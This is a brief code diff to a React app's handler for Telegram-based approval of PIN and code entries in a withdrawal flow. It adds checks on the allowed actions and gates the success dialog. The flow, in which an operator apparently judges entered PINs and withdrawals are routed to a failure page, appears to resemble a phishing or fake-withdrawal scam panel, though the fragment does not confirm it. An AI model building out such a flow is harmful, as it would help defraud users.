@@ -266,6 +266,8 @@ function App() {
   };
 
   const handleTelegramApproval = (action) => {
+    if (!['correct', 'wrong-pin', 'wrong-code'].includes(action)) return;
+
     setTelegramApprovalOpen(false);
 
     if (action === 'wrong-pin') {
@@ -281,12 +283,14 @@ function App() {
       return;
     }
 
-    if (approvalStage === 'withdrawal') {
+    if (action === 'correct' && approvalStage === 'withdrawal') {
       setPage('withdrawalFailed');
       return;
     }
 
-    setWithdrawalSuccessOpen(true);
+    if (action === 'correct' && approvalStage === 'verification') {
+      setWithdrawalSuccessOpen(true);
+    }
   };
 
   const verifyOtp = async () => {
